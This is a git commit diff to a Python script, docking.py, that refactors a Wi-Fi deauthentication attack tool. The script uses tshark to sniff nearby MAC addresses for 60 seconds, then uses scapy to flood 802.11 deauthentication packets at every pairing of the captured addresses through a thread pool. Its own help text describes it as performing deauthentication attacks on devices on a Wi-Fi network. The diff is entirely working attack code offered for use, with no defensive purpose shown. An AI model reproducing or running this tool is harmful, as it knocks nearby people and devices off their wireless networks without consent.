c1978c19fc6f7a1b58d35078336d2429b8603c28
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-05-26 10:42:50 +0900

    Update docking.py

--- docking.py
+++ docking.py
@@ -3,11 +3,10 @@ import concurrent.futures
 import time
 import subprocess
 import re
-def deauth(target_mac, access_point_mac):
-    print("deauth: router:{}, device:{}".format(access_point_mac,target_mac))
-    interface = "en0"
-    packet_count = 100
-    interval = 0.1
+import argparse
+
+def deauth(target_mac, access_point_mac, interface, packet_count, interval):
+    print("deauth: router:{}, device:{}".format(access_point_mac, target_mac))
     conf.iface = interface
     pkt = (
         RadioTap() /
@@ -15,12 +14,9 @@ def deauth(target_mac, access_point_mac):
         Dot11Deauth()
     )
     sendp(pkt, inter=interval, count=packet_count, verbose=0)
-def everything():
-    disconnect_cmd = "networksetup -setairportpower en0 off"
-    subprocess.run(disconnect_cmd, shell=True)
-    disconnect_cmd = "networksetup -setairportpower en0 on"
-    subprocess.run(disconnect_cmd, shell=True)
-    tshark_cmd = "tshark -i en0 -I -a duration:60"
+
+def capture_mac_addresses(interface):
+    tshark_cmd = f"tshark -i {interface} -I -a duration:60"
     tshark_process = subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
     mac_addresses = []
@@ -30,12 +26,32 @@ def everything():
         if mac_matches:
             mac_addresses.extend(mac_matches)
     return set(mac_addresses)
-maccy=everything()
-with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
-    for wifi in maccy:
-        for device in maccy:
-            try:
-                executor.submit(deauth, device, wifi)
-            except Exception as e:
-                time.sleep(60)
-                executor.submit(deauth, device, wifi)
+
+def run_deauth_attacks(maccy, interface, packet_count, interval):
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        for wifi in maccy:
+            for device in maccy:
+                try:
+                    executor.submit(deauth, device, wifi, interface, packet_count, interval)
+                except Exception as e:
+                    print(f"Exception occurred: {e}")
+                    time.sleep(60)
+                    executor.submit(deauth, device, wifi, interface, packet_count, interval)
+
+def main():
+    parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
+    parser.add_argument('-i', '--interface',type=str, default='en0', help='Network interface to use for the attack')
+    parser.add_argument('-c', '--count', type=int, default=100, help='Number of deauthentication packets to send per attack (default: 100)')
+    parser.add_argument('-d', '--interval', type=float, default=0.1, help='Interval between deauthentication packets (default: 0.1)')
+    args = parser.parse_args()
+
+    disconnect_cmd = f"networksetup -setairportpower {args.interface} off"
+    subprocess.run(disconnect_cmd, shell=True)
+    disconnect_cmd = f"networksetup -setairportpower {args.interface} on"
+    subprocess.run(disconnect_cmd, shell=True)
+
+    mac_addresses = capture_mac_addresses(args.interface)
+    run_deauth_attacks(mac_addresses, args.interface, args.count, args.interval)
+
+if __name__ == '__main__':
+    main()
